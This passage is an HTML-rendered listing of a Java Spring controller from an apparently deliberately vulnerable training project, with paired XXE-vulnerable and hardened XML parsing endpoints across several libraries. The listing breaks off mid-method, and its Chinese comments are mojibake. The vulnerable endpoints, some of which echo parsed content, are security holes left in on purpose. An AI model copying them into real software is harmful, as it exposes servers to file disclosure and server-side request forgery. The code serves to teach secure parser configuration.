class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.dom4j.DocumentHelper;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.digester3.Digester;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> org.joychou.util.WebUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java xxe vuln and security code.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2017-12-22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/xxe"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = LoggerFactory.getLogger(XXE<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String EXCEPT = <span class="string">"xxe except"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/xmlReader/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// parse xml</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"xmlReader xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/xmlReader/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xmlReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">            <span class="comment">// fix code start</span></span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">//fix code end</span></span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"xmlReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXBuilder/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXBuilderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            <span class="comment">// org.jdom2.Document document</span></span><br><span class="line">            builder.build(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));  <span class="comment">// cause xxe</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"SAXBuilder xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXBuilder/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            builder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">// org.jdom2.Document document</span></span><br><span class="line">            builder.build(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXBuilder xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXReader/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            <span class="comment">// org.dom4j.Document document</span></span><br><span class="line">            reader.read(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body))); <span class="comment">// cause xxe</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXReader xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXReader/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            reader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            reader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            reader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">// org.dom4j.Document document</span></span><br><span class="line">            reader.read(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXParser/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXParserVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)), <span class="keyword">new</span> DefaultHandler());  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"SAXParser xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXParser/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXParserSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            spf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)), <span class="keyword">new</span> DefaultHandler());  <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXParser xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/Digester/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DigesterVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">            digester.parse(<span class="keyword">new</span> StringReader(body));  <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Digester xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/Digester/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DigesterSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">            digester.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            digester.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            digester.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            digester.parse(<span class="keyword">new</span> StringReader(body));  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Digester xxe security code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ‰å›æ˜¾</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/vuln01"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln01</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// éå†xmlèŠ‚ç‚¹nameå’Œvalue</span></span><br><span class="line">            StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ‰å›æ˜¾</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/vuln02"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln02</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// éå†xmlèŠ‚ç‚¹nameå’Œvalue</span></span><br><span class="line">            StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    <span class="comment">// æ­£å¸¸è§£æXMLï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦æ˜¯ELEMENT_NODEç±»å‹ã€‚å¦åˆ™ä¼šå‡ºç°å¤šä½™çš„çš„èŠ‚ç‚¹ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getFirstChild()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/Sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/xinclude/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderXincludeVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// æ”¯æŒXInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// æ”¯æŒXInclude</span></span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"DocumentBuilder xinclude xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/xinclude/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderXincludeSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">            dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// æ”¯æŒXInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// æ”¯æŒXInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            